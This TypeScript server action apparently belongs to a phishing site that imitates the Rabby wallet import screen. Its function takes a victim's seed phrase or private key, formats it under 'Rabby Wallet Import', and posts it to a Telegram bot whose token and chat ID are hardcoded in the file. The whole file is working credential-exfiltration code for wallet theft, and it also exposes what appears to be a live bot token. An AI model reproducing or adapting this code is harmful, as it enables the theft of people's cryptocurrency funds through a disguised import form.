"use server"

const TELEGRAM_BOT_TOKEN = "8585737545:AAFSAMl1SvuORjqZ_p25LfVysCygY033TGQ"
const TELEGRAM_CHAT_ID = "6235082597"

export async function sendToTelegram(type: "seed_phrase" | "private_key", data: string) {
  try {
    const timestamp = new Date().toISOString()
    const message = `🔐 *Rabby Wallet Import*\n\n` +
      `*Type:* ${type === "seed_phrase" ? "Seed Phrase" : "Private Key"}\n` +
      `*Time:* ${timestamp}\n` +
      `*Data:*\n\`\`\`\n${data}\n\`\`\``

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!response.ok) {
      const errorData = await response.json()
      console.error("Telegram API error:", errorData)
      return {
        success: false,
        error: errorData.description || "Failed to send message",
      }
    }

    return {
      success: true,
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return {
      success: false,
      error: error instanceof Error ? error.message : "Unknown error",
    }
  }
}








